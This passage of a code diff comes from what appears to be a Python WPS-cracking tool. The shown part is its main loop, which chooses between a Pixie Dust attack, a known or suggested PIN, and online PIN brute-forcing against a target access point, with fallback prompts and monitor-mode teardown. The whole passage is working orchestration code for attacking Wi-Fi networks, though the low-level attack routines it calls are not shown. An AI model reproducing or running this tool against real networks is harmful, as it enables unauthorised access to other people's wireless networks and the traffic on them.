+                                timeout=args.timeout, delay=args.delay,
+                                json_mode=args.json)
+
                             pixiemode = args.pixie_dust
                             pin = args.pin
+
                             if not pin and not args.bruteforce and not pixiemode and selected_vuln:
-                                print(UI.msg('warn', f'Target looks Pixie Dust vulnerable ({selected_chipset or "?"})'),
-                                      file=sys.stderr)
-                                try:
-                                    if input(UI.info('[?] Try Pixie Dust first? [Y/n] ')).strip().lower() != 'n':
-                                        pixiemode = True
-                                except (EOFError, KeyboardInterrupt): pixiemode = True
+                                chipset = selected_chipset or 'unknown chipset'
+                                print(UI.msg('warn', f'Target {args.bssid} looks Pixie Dust vulnerable ({chipset}).'))
+                                ans = input(UI.info('[?] Try Pixie Dust attack first? [Y/n] ')).strip().lower()
+                                if ans != 'n':
+                                    pixiemode = True
+
                             if not pin and not args.bruteforce and not pixiemode:
                                 known = db.known_pin(args.bssid)
-                                if known: pin = known
+                                if known:
+                                    print(UI.msg('info', f'Known PIN in DB for {args.bssid}: {known}'))
+                                    pin = known
                                 else:
-                                    pins = WPSpin().getSuggestedUnique(args.bssid)
-                                    if len(pins) == 1: pin = pins[0]['pin']
-                                    elif len(pins) > 1:
-                                        print(UI.section(f'Suggested PINs for {args.bssid}'), file=sys.stderr)
-                                        print(UI.table(['#', 'PIN', 'Name'],
-                                                       [[UI.muted(f'{i + 1})'), UI.ok(p['pin']), p['name']]
-                                                        for i, p in enumerate(pins)],
-                                                       aligns=['r', 'l', 'l']), file=sys.stderr)
-                                        try:
-                                            c = input(UI.info('Select PIN (Enter=Pixie/BF): ')).strip()
-                                            if c.isdigit() and 1 <= int(c) <= len(pins):
-                                                pin = pins[int(c) - 1]['pin']
-                                        except (EOFError, KeyboardInterrupt): pass
+                                    generator = WPSpin()
+                                    pins = generator.getSuggestedUnique(args.bssid)
+                                    if len(pins) > 1:
+                                        print(UI.section(f'Suggested PINs for {args.bssid}'))
+                                        rows = [[UI.muted(f'{i + 1})'), UI.ok(p['pin']), p['name']]
+                                                for i, p in enumerate(pins)]
+                                        print(UI.table(['#', 'PIN', 'Name'], rows,
+                                                       aligns=['r', 'l', 'l']))
+                                        choice = input(UI.info('Select PIN (or Enter for Pixie Dust / Brute-force): ')).strip()
+                                        if choice.isdigit() and 1 <= int(choice) <= len(pins):
+                                            pin = pins[int(choice) - 1]['pin']
+                                    elif len(pins) == 1:
+                                        pin = pins[0]['pin']
+
                             res = None
                             if pixiemode or (not pin and not args.bruteforce):
-                                res = atk.pixie_dust(args.bssid, channel=selected_channel)
+                                res = attacker.pixie_dust(args.bssid, channel=selected_channel)
                                 if not res.success and not pin and not args.bruteforce:
-                                    try:
-                                        if input(UI.info('[?] Fall back to brute-force? [y/N] ')).strip().lower() == 'y':
-                                            res = atk.bruteforce(args.bssid, channel=selected_channel,
-                                                                 start_pin=args.pin)
-                                    except (EOFError, KeyboardInterrupt): pass
+                                    print(UI.msg('err', f'Pixie Dust attack failed with {args.backend}'))
+                                    if input(UI.info('[?] Fall back to online brute-force? [y/N] ')).strip().lower() == 'y':
+                                        res = attacker.bruteforce(
+                                            args.bssid, channel=selected_channel, start_pin=args.pin)
                             elif pin:
-                                res = atk.single_pin(args.bssid, pin, channel=selected_channel)
+                                res = attacker.single_pin(args.bssid, pin, channel=selected_channel)
                             elif args.bruteforce:
-                                res = atk.bruteforce(args.bssid, channel=selected_channel,
-                                                     start_pin=args.pin)
+                                res = attacker.bruteforce(
+                                    args.bssid, channel=selected_channel, start_pin=args.pin)
+
                             if res is not None:
-                                _handle_backend_result(res, args.bssid, db=db,
-                                                       save_result=args.write,
-                                                       reports_dir=reports_dir,
-                                                       json_mode=args.json)
+                                _handle_backend_result(
+                                    res, args.bssid, db=db, save_result=args.write,
+                                    reports_dir=reports_dir, json_mode=args.json)
+                            else:
+                                print(UI.msg('err', 'No attack mode selected for external backend'))
                         finally:
-                            teardown_monitor_mode(mon, args.interface)
+                            print(UI.msg('info', f'Restoring {args.interface} to managed mode…'))
+                            teardown_monitor_mode(mon_iface, args.interface)
+
                     else:
-                        comp = Companion(args.interface, args.write,
-                                         print_debug=args.verbose, db=db,
-                                         json_mode=args.json, trace_log=args.trace_log,
-                                         pixiewps_timeout=args.pixie_timeout,
-                                         cool_down=args.cool, save_capture=args.save_capture,
-                                         dry_run=args.dry_run,
-                                         lockout_budget=args.lockout_budget)
+                        comp = Companion(
+                            args.interface, args.write,
+                            print_debug=args.verbose, db=db,
+                            json_mode=args.json, trace_log=args.trace_log,
+                            pixiewps_timeout=args.timeout, cool_down=args.cool)
                         try:
                             comp.target_is_pixie_vuln = selected_vuln
                             comp.target_chipset = selected_chipset
                             if args.bruteforce:
-                                comp.smart_bruteforce(args.bssid, args.pin, args.delay,
-                                                      loop=args.loop, auto_resume=args.resume)
+                                comp.smart_bruteforce(
+                                    args.bssid, args.pin, args.delay,
+                                    loop=args.loop,
+                                    auto_resume=args.resume)
                             else:
-                                comp.single_connection(args.bssid, args.pin, args.pixie_dust,
-                                                       args.pbc, args.show_pixie_cmd,
-                                                       args.pixie_force)
+                                comp.single_connection(
+                                    args.bssid, args.pin, args.pixie_dust,
+                                    args.pbc, args.show_pixie_cmd,
+                                    args.pixie_force)
                         finally:
                             comp.cleanup()
-                if not args.loop: break
+                if not args.loop:
+                    break
                 args.bssid = None
             except KeyboardInterrupt:
                 if args.loop:
-                    try:
-                        if input(UI.info('\n[?] Exit? [N/y] ')).lower() == 'y':
-                            break
-                    except (EOFError, KeyboardInterrupt): break
+                    if input(UI.info('\n[?] Exit the script '
+                                     '(otherwise continue to AP scan)? [N/y] ')
+                             ).lower() == 'y':
+                        print(UI.msg('warn', 'Aborting…'))
+                        break
                     args.bssid = None
                 else:
-                    print('\n' + UI.msg('warn', 'Aborting…'), file=sys.stderr); break
+                    print('\n' + UI.msg('warn', 'Aborting…'))
+                    break
     finally:
-        if args.iface_down: ifaceUp(args.interface, down=True)
+        if args.iface_down:
+            ifaceUp(args.interface, down=True)
         if args.mtk_wifi:
-            try: Path('/dev/wmtWifi').write_text('0')
-            except Exception: pass
+            try:
+                Path('/dev/wmtWifi').write_text('0')
+            except Exception:
+                pass
         db.close()
-    return 0
-
-
-if __name__ == '__main__':
-    sys.exit(main())
